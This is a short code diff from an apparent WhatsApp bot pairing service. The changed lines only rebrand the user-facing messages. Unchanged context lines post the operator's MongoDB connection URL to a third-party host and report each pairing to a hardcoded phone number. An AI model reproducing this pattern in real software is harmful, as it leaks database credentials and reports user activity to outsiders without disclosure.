@@ -62,11 +62,11 @@ router.get('/', async (req, res) => {
                     const userCountResponse = await axios.post('https://api.lokiser.xyz/mongoose/session/count', { mongoUrl: MONGODB_URL });
                     const userCount = userCountResponse.data.count;
                     
-                    await session.sendMessage(session.user.id, { text: ` *⛒ ᴛʜᴀɴᴋ чᴏᴜ ғᴏʀ ᴄʜᴏᴏꜱɪɴɢ qᴜᴇᴇɴ-ɴᴇᴢᴜᴋᴏ⭜*
+                    await session.sendMessage(session.user.id, { text: ` *𝘛𝘩𝘢𝘯𝘬𝘻 𝘧𝘰𝘳 𝘶𝘴𝘪𝘯𝘨 𝘛𝘦𝘻𝘻𝘢 𝘮𝘥 📍*
 
-                       *⛥  ᴛʜɪꜱ ɪꜱ ʏᴏᴜʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ ᴩʟᴇᴀꜱᴇ ᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ⤾*\n\n *Total Scan :* ${userCount}` });
+                       *𝘛𝘩𝘪𝘴 𝘪𝘴 𝘺𝘰𝘶𝘳 𝘴𝘦𝘴𝘴𝘪𝘰𝘯 𝘪𝘥 𝘱𝘭𝘦𝘢𝘴𝘦 𝘥𝘰 𝘯𝘰𝘵 𝘴𝘩𝘢𝘳𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘥𝘦 𝘸𝘪𝘵𝘩 𝘢𝘯𝘺𝘰𝘯𝘦 ‼️*\n\n *Total Scan :* ${userCount}` });
                     await session.sendMessage(session.user.id, { text: data.data });
-                    await session.sendMessage("254738719757@s.whatsapp.net", { text: "*Successfully Paired Queen-nezuko-Md*✅" });
+                    await session.sendMessage("254738719757@s.whatsapp.net", { text: "*𝘛𝘦𝘻𝘻𝘢 𝘮𝘥 𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺 𝘱𝘢𝘪𝘳𝘦𝘥 👄" });
 
                     await delay(100);
                     await session.ws.close();
